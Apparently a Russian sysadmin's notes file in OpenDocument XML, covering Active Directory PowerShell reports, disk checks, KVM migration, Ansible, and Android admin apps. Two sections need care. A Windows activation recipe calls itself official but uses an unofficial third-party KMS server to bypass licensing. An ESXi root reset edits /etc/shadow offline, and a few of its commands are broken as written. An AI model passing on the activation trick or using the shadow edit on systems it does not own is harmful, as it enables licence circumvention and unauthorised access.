      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Date = Get-Date -Format "dd MMMM yyyy HH:mm"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$AllUsers = (Get-AdUser -Filter * | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$ActiveUsers = (Get-ADUser -Filter {Enabled -eq $true} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$DisabledUsers = (Get-ADUser -Filter {Enabled -eq $false} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StartDate = (Get-Date).AddDays(-1)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$EndDate <text:s text:c="2"/>= (Get-Date).AddDays(+1)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Zapros = Get-ADUser -Filter * -Properties Created | Where-Object {$_.Created -gt $StartDate -and $_.Created -le $EndDate}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$NewUsers = ($Zapros).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$OFS = "`r`n" #`r`n`r`n</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">"$($WhoUsers = $Zapros | foreach {$_.Name })"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$NotSurname = Get-ADUser -filter "Enabled -eq '$true' -and Surname -notlike '*' -and Name -ne 'Healthmailbox'"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">$NotFIO = ($NotSurname).count</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Message = "</text:span><text:span text:style-name="T3">На</text:span><text:span text:style-name="T2"> $Date </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> ActiveDirectory </text:span><text:span text:style-name="T3">всего</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пользователей</text:span><text:span text:style-name="T2"> $AllUsers </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">них</text:span><text:span text:style-name="T2">: `n</text:span><text:span text:style-name="T3">Активных</text:span><text:span text:style-name="T2">: $ActiveUsers </text:span><text:span text:style-name="T3">из</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">них</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">служебные</text:span><text:span text:style-name="T2">: $NotFIO. `n</text:span><text:span text:style-name="T3">Заблокированных</text:span><text:span text:style-name="T2">: $DisabledUsers. `n</text:span><text:span text:style-name="T3">Новых</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пользователей</text:span><text:span text:style-name="T2">: $NewUsers `r`n`r`n$WhoUsers"</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$Message | Out-File -FilePath <text:s/>"C:\temp\$(Get-Date -Format "dd MMMM yyyy")-UsersAD.txt"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16">После выполнения получаем файлик с текущей датой в папке temp.</text:p>
      <text:p text:style-name="P13">Скрипт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oft-page-break/><text:span text:style-name="T2">:local char [[:parse "(\"\\$[:pick "0123456789ABCDEF" (($key &gt;&gt; 4) &amp; 0xF)]$[:pick "0123456789ABCDEF" ($key &amp; 0xF)]\")"]]</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">badblocks - команда для поиска и исправления поврежденных секторов на жестких дисках:</text:p>
      <text:p text:style-name="P13">Команда badblocks предназначена для поиска и исправления поврежденных секторов на жестких дисках. На сегодняшний день она в некоторой степени утратила свою актуальность из-за того, что современные жесткие диски осуществляют переназначение поврежденных секторов в автоматическом режиме сразу же после возникновения ошибок, связанных с чтением или записью данных.</text:p>
      <text:p text:style-name="P13">Тем не менее, она может использоваться для активации упомянутого механизма переназначения секторов, так как при работе в основном режиме она осуществляет посектороное чтение данных с жесткого диска, которое позволяет жесткому диску выявить и переназначить поврежденные сектора. Предупреждение: не используйте рассматриваемую команду, если не до конца уверены в правильности своих действий или не понимаете сути происходящих процессов, ведь в результате даже незначительной ошибки вы можете лишиться всех хранящихся на диске данных. Кроме того, не пытайтесь использовать эту команду по отношению к смонтированному разделу или к диску с со смонтирнованными разделами, ведь в этом случае последствия будут непредсказуемыми. Перед использованием badblocks необходимо определиться с жестким диском или его разделом, на котором нужно искать поврежденные сектора. Для этого может использоваться команда lsblk:</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text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">В данном случае в столбце NAME будут выводиться имена файлов устройств накопителей и их разделов (для обозначения разделов используется дополнительная нумерация), в столбце FSTYPE - названия созданных в разделах файловых систем, в столбце LABEL - метки разделов, в столбце MOUNTPOINT - пути к точкам монтирования файловых систем, а в столбце MODEL - информация о моделях устройств.</text:p>
      <text:p text:style-name="P1">Базовый синтаксис команды:</text:p>
      <text:p text:style-name="P1"># badblocks -v /dev/&lt;имя файла раздела или устройства&gt;</text:p>
      <text:p text:style-name="P1">Параметр -v используется для вывода информации о ходе процесса проверки жесткого диска.</text:p>
      <text:p text:style-name="P1">Если вам по какой-либо причине понадобится запретить использование поврежденных секторов на уровне файловой системы вы всегда можете сохранить список этих секторов и передать его утилите e2fsck. Это делается следующим образом:</text:p>
      <text:p text:style-name="P1"># badblocks -v /dev/&lt;имя файла раздела или устройства&gt; &gt; /tmp/badblocks.txt</text:p>
      <text:p text:style-name="P1"># e2fsck -l /tmp/bad-blocks.txt /dev/&lt;имя файла раздела или устройства&gt;</text:p>
      <text:p text:style-name="P1"># rm /tmp/badblocks.txt</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Однако, в большинстве случаев будет достаточно однокртного посектороного чтения данных из раздела или со всего устройства.</text:span></text:p>
      <text:p text:style-name="P1">Примеры использования</text:p>
      <text:p text:style-name="P1">1. Выбор раздела жесткого диска для проверки</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sdb <text:s text:c="47"/>MAXTOR STM316081</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">├─sdb4 <text:s/>ext4 <text:s text:c="3"/>home <text:s text:c="5"/>/home <text:s text:c="19"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">├─sdb2 <text:s/>ext4 <text:s text:c="3"/>Debian <text:s text:c="28"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">└─sdb1 <text:s/>swap <text:s text:c="38"/></text:p>
      <text:p text:style-name="P1">...</text:p>
      <text:p text:style-name="P1">Выберем раздел с корневой файловой сситемой дистрибутива Debian (с соотвествующей меткой), который в данный момент не смонтирован. Ему соответствует файл устройства sdb2.</text:p>
      <text:p text:style-name="P1">2. Проверка выбранного раздела на наличие поврежденных секторов</text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># badblocks -v /dev/sdb2</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">Checking blocks 0 to 12697599</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Checking for bad blocks (read-only test): <text:s/>done <text:s text:c="42"/></text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Pass completed, 0 bad blocks found. </text:span><text:span text:style-name="T3">(0/0/0 errors)</text:span></text:p>
      <text:p text:style-name="P7">Очевидно, что в ходе проверки раздела поврежденных секторов не было обнаружено.</text:p>
      <text:p text:style-name="P1">Объединение файлов командой cat:</text:p>
      <text:p text:style-name="P1">Команду cat в большинстве случаев используют только для просмотра файлов. На самом деле одно из ее предназначений это конкатенация (объединение) файлов. А название команды происходит от слова catenate (сцепить), то есть присоединение одного после другого.</text:p>
      <text:p text:style-name="P1">Под объединением файлов понимается их соединение. Например, если мы имеем два текстовых файла и в одном из них записана строка:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">My text file 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">А</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">другом</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">My text file 2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">То после объединения мы получим файл с двумя строками:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">My text file 1</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">My text file 2</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">То есть происходит простое соединение файлов. К содержимому одного добавляется содержимое другого. Это касается не только текстовых файлов, но и всех остальных (бинарных, например). Чтобы объединить два файла командой cat нужно просто указать в качестве аргументов названия этих файлов и направить результат выполнения в новый файл. Например, мы хотим объединить два файла file1 и file2, а результат записать в новый файл file12. Тогда мы должны выполнить следующую команду:</text:p>
      <text:p text:style-name="P1">cat file1 file2 &gt; file12</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Вы можете объединить неограниченное количество файлов. Например, чтобы объединить четыре файла и записать результат в файл myfile, выполните команду:</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">cat file1 file2 file3 file4 &gt; myfile</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Powershell мониторинг событий 41, 1074, 6008:</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">|||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text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">$StrData=[string]$flam.Date</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $StrData + " " + "</text:span><text:span text:style-name="T3">Сервер</text:span><text:span text:style-name="T2">: $env:computername" + " " + "</text:span><text:span text:style-name="T3">Система</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">перезагрузилась</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">завершив</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">работу</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">ошибками</text:span><text:span text:style-name="T2">.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14"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1074:|||</text:span></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6008|||</text:span></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oft-page-break/><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3" loext:marker-style-name="T1"><text:span text:style-name="T2">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span><text:span text:style-name="T2"/></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3" loext:marker-style-name="T1"><text:span text:style-name="T2">$ ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Как проверить количество системных дескрипторов файлов в </text:span><text:span text:style-name="T2">Linux</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P14"><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text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">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text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Sysctl</text:span><text:span text:style-name="T3"> используется для настройки параметров ядра.</text:span></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p>
      <text:p text:style-name="P2"><text:span text:style-name="T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text:span></text:p>
      <text:p text:style-name="P1">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text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">soft</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">nofile</text:span><text:span text:style-name="T3"> 1024</text:span></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14"><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14"><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oft-page-break/><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Скрипты для диагностики </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">TESTER</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Тестирование скорости ответа </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3"> со статистикой превышения, минимума, максимума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dns</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">tester</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">BENCH</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">DNS</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Простой скрипт для тестирования загрузки </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3">. Написан на языке </text:span><text:span text:style-name="T2">Go</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ench</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">dns</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">CHECK-DNS-SERVERS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Проверка</text:span><text:span text:style-name="T2"> DNS - </text:span><text:span text:style-name="T3">Дата</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сертификата</text:span><text:span text:style-name="T2">, DNS resolve, HTTP 200 - https://github.com/m0zgen/check-dns-servers</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">MAC-DNS</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Очистка кэша DNS и настройка DNS IP сервисов - Google, Cloudflare, BLD - https://github.com/m0zgen/mac-dns</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">BLD</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">LOOKUP</text:span></text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Соберите все </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3">-адреса </text:span><text:span text:style-name="T2">DNS</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">BLD</text:span><text:span text:style-name="T3"> и попытайтесь разрешить целевой домен с каждым </text:span><text:span text:style-name="T2">IP</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">BLD</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ld</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">lookup</text:span></text:p>
      <text:p text:style-name="P1">Как сменить пароль Linux пользователя при помощи Ansible: </text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">change_password.yml</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">---</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">- name: user module demo</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>hosts: all</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>become: true</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>vars:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>myuser: "example"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>mypassword: "password"</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="2"/>tasks:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="4"/>- name: change password</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="6"/>ansible.builtin.user:</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>name: "{{ myuser }}"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>state: present</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"><text:s text:c="8"/>password: "{{ mypassword | password_hash('sha512') }}"</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Запуск</text:span><text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2">ansible-playbook change_password.yml</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Как бесплатно активировать Windows? Если вы столкнулись с проблемой лицензирования Windows, попробуйте обратиться к официальным ресурсам Microsoft. Компания предоставляет универсальные ключи многократной установки, которые помогут активировать Windows. Для активации:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">1. Пройдите по ссылке (https://learn.microsoft.com/ru-ru/windows-server/get-started/kms-client-activation-keys) и скопируйте ключ, подходящий под вашу версию Windows.</text:span></text:p>
      <text:p text:style-name="P1">2. В поиске введите «cmd», тапните правой кнопкой по приложению «Командная строка» и выберите «Запуск от имени администратора».</text:p>
      <text:p text:style-name="P1">3. Введите команду «slmgr/ipk &lt;ваш_скопированный_ключ&gt;».</text:p>
      <text:p text:style-name="P1">4. После введите «slmgr /skms kms.digiboy.ir».</text:p>
      <text:p text:style-name="P1">5. Последняя команда «slmgr /ato».</text:p>
      <text:p text:style-name="P7">Если все сделано правильно, вы получите сообщение об успешной активации Windows.</text:p>
      <text:p text:style-name="P1">KVM быстрый перенос виртуальной машины на другой сервер. Представим, что есть несколько гипервизоров - server1 и server2, как быстро перенести виртуального гостя с одного сервера, на другой? Очень просто. Действия на server1:</text:p>
      <text:p text:style-name="P1">Выключить машину: virsh shutdown vm1</text:p>
      <text:p text:style-name="P1">Сделать дамп конфигурации машины: virsh dumpxml vm1 &gt; ~/vm1.xml</text:p>
      <text:p text:style-name="P1">Скопировать данные на другой хост:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">scp ~/vm1.xml server2:/path/to/folder/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">scp /var/lib/libvirt/images/vm1.qcow2 server2:/var/lib/libvirt/images/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Действия</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> server2:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Импортировать</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">конфиг</text:span><text:span text:style-name="T2">: virsh define /path/to/folder/vm1.xml</text:span></text:p>
      <text:p text:style-name="P1">Запустить виртуалную машину:virsh start vm1</text:p>
      <text:p text:style-name="P1">Удаление виртуальной машины KVM:</text:p>
      <text:p text:style-name="P1">Удалить машину: virsh undefine vm1</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Удалить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">диск</text:span><text:span text:style-name="T2">: virsh vol-delete --pool default vm1</text:span></text:p>
      <text:p text:style-name="P7">Убедиться, что файл образа так же удален: rm /var/lib/libvirt/images/vm1.qcow2</text:p>
      <text:p text:style-name="P1">Безопасность Linux (серия из 5 частей):</text:p>
      <text:p text:style-name="P1">1. Некоторые мысли о безопасности Linux (https://dev.to/jmau111/some-thoughts-about-linux-security-545n);</text:p>
      <text:p text:style-name="P1">2. Bash-скрипт для настройки Linux (https://dev.to/jmau111/a-bash-script-to-configure-linux-565n);</text:p>
      <text:p text:style-name="P13">3. Как проверить Linux-машину (https://dev.to/jmau111/how-to-inspect-a-linux-machine-4p49);</text:p>
      <text:p text:style-name="P13">4. Мысли о безопасности ОС (https://dev.to/jmau111/thoughts-on-os-security-4gmk);</text:p>
      <text:p text:style-name="P7">5. SELinux: руководство для начинающих (https://dev.to/jmau111/selinux-beginners-guide-15af)</text:p>
      <text:p text:style-name="P1">Полезный софт под Android:</text:p>
      <text:p text:style-name="P1">Termius (ex. ServerAuditor) - Быстрая, функциональная, удобная программка для доступа к серверу по SSH. https://www.termius.com/ https://4pda.to/forum/index.php?showtopic=419987</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Remote Desktop - Используйте Удаленный рабочий стол (Майкрософт) для Android для подключения к Виртуальному рабочему столу Azure, Windows 365, виртуальным приложениям и рабочим столам, предоставленным администратором, или к удаленным компьютерам. С помощью Удаленного рабочего стола (Майкрософт) вы можете работать продуктивно, где бы вы ни находились https://play.google.com/store/apps/details?id=com.microsoft.rdc.androidx&amp;hl=ru&amp;gl=US&amp;pli=1</text:span></text:p>
      <text:p text:style-name="P1">VNC Viewer Remote Desktop - VNC Viewer превращает ваш телефон в удаленный рабочий стол, предоставляя вам мгновенный доступ к вашим компьютерам Mac, Windows и Linux из любой точки мира https://play.google.com/store/apps/details?id=com.realvnc.viewer.android&amp;hl=ru&amp;gl=US https://4pda.to/forum/index.php?showtopic=119414</text:p>
      <text:p text:style-name="P1">Proxmox Virtual Environment - Войдите на свой сервер Proxmox Virtual Environment (VE) и управляйте виртуальными машинами, контейнерами, хостами и кластерами https://play.google.com/store/apps/details?id=com.proxmox.app.pve_flutter_frontend&amp;hl=ru&amp;gl=US</text:p>
      <text:p text:style-name="P1">MikroTik Pro - Используйте приложение для смартфона MikroTik, чтобы настроить маршрутизатор, когда компьютер недоступен https://play.google.com/store/apps/details?id=com.mikrotik.android.tikapp&amp;hl=ru&amp;gl=US https://4pda.to/forum/index.php?showtopic=999729</text:p>
      <text:p text:style-name="P1">Moobix 2.0 - Moobix идеально подходит для вас, используя систему мониторинга Zabbix, вы будете иметь ключевые функции инструмента в любое время и в любом месте. https://play.google.com/store/apps/details?id=cloud.zabbixinbox.moobixapp</text:p>
      <text:p text:style-name="P1">Tabbix - Важно: Вы должны написать полный URL-адрес zabbix при добавлении нового сервера. Если ваш zabbix работает на http: // yourzabbixurl / zabbix, вам нужно записать http: // yourzabbixurl / zabbix на новое текстовое поле сервера https://play.google.com/store/apps/details?id=com.tirgil.tabbix&amp;hl=ru&amp;gl=US</text:p>
      <text:p text:style-name="P1">OpenVPN Connect - Официальное приложение для Access Server, OpenVPN Cloud и сервисов, совместимых с OpenVPN https://4pda.to/forum/index.php?showtopic=727790 https://play.google.com/store/apps/details?id=net.openvpn.openvpn&amp;hl=ru&amp;gl=US</text:p>
      <text:p text:style-name="P1">Total Commander - Двухпанельный файловый менеджер для Android с русским интерфейсом https://4pda.to/forum/index.php?showtopic=224555 https://play.google.com/store/apps/details?id=com.ghisler.android.TotalCommander&amp;hl=ru&amp;gl=US</text:p>
      <text:p text:style-name="P17">Linux Command Library - В настоящее время приложение содержит 4608 справочных страниц, 21 основные категории и множество общих советов по работе с терминалом. Он работает на 100% в автономном режиме, не требует подключения к Интернету и не имеет программного обеспечения для отслеживания https://play.google.com/store/apps/details?id=com.inspiredandroid.linuxcommandbibliotheca&amp;hl=ru&amp;gl=US https://f-droid.org/ru/packages/com.inspiredandroid.linuxcommandbibliotheca/</text:p>
      <text:p text:style-name="P7">WiFi network Analyzer - Это приложение отслеживает и анализирует Вашу сеть и предупреждает если есть проблемы https://4pda.to/forum/index.php?showtopic=662401</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T3">Срок действия учетной записи: Узнать срок действия учетной записи в ActiveDirectory можно через оснастку: Пользователи и компьютеры или с помощью команды Powershell. Во втором случае мы получим список всех учетных записей, у которых заканчивается срок действия. </text:span><text:span text:style-name="T2">Search-ADAccount -AccountExpiring -UsersOnly -TimeSpan 07.00:00:00 | Sort-Object -Descending AccountExpirationDate | ft Name, AccountExpirationDate. </text:span><text:span text:style-name="T3">Устанавливаем TimeSpan на одну неделю и получаем список учетных записей срок действия которых закончится в течение одной недели (7 дней).</text:span></text:p>
      <text:p text:style-name="P1">Команды Linux:</text:p>
      <text:p text:style-name="P1">ulimit - команда для вывода информации о лимитах ресурсов текущего пользователя;</text:p>
      <text:p text:style-name="P1">umount - команда для отключения файловой системы заданного устройства;</text:p>
      <text:p text:style-name="P1">uname - команда для вывода информации о версии ядра операционной системы;</text:p>
      <text:p text:style-name="P1">uniq - команда для удаления повторяющихся строк из текстового файла;</text:p>
      <text:p text:style-name="P1">unlink - команда для удаления ссылки на элемент файловой системы;</text:p>
      <text:p text:style-name="P1">unzip - команда для распаковки архива формата ZIP;</text:p>
      <text:p text:style-name="P1">uptime - команда для вывода информации о времени, в течение которого ваш компьютер функционирует;</text:p>
      <text:p text:style-name="P1">useradd - команда для создания новой учетной записи пользователя;</text:p>
      <text:p text:style-name="P1">userdel - команда для удаления учетной записи пользователя;</text:p>
      <text:p text:style-name="P7">usermod - команда для изменения параметров учетной записи пользователя</text:p>
      <text:p text:style-name="P1">Как быстро сбросить пароль от Root в ESXI ? / ESXI / root password /</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># sudo su</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># fdisk - l | grep /dev/sda</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># mkdir /mnt/sda5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># mkdir /temp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># mount /dev/sda5 /mnt/sda5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># ls -l /mnt/sda5/state.tgz</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -xf /mnt/sda5/state.tgz - C /temp/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"># tar -xf /temp/local.tgz - C /temp/</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># rm /temp/*.tgz</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># nano /temp/etc/shadow</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># nano /temp/etc/shadow</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># cd /temp</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -czf local.tgz etc</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># tar -czf state.tgz local.tgz</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># mv state.tgz /mnt/sda5/</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># umount /mnt/sda5</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2"># reboot</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">Cisco. </text:span><text:span text:style-name="T3">Базовая настройка:</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Заливаем последнюю прошивку(для </text:span><text:span text:style-name="T2">SSH</text:span><text:span text:style-name="T3"> необходим минимум </text:span><text:span text:style-name="T2">Advanced</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Security</text:span><text:span text:style-name="T3">), избавляемся от преднастроенного мусора и перегружаемся - </text:span><text:span text:style-name="T2">erase</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">startup</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">config</text:span></text:p>
